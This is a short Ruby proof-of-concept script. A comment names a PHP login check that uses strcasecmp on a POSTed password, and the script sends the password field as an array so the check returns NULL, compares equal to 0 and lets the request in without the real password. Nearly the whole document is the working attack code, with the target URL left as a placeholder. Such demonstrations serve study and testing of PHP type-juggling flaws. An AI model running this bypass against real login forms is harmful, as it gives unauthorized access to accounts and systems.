# The hole of
#if (strcasecmp($_POST['password'], $password) == 0)
# Enable this line with array parameter
require 'net/http'
require 'uri'

url = URI.parse('php cgi')
req = Net::HTTP::Post.new(url.path)
req.body = URI.encode_www_form [
  ["password[]", "hoge"],
  ["password[]", "fuga"],
  ["password[]", "piyo"]
]
res = Net::HTTP.new(url.host, url.port).start {|http| http.request(req) }
case res
when Net::HTTPSuccess, Net::HTTPRedirection
  puts res.body
else
  puts res.value
end
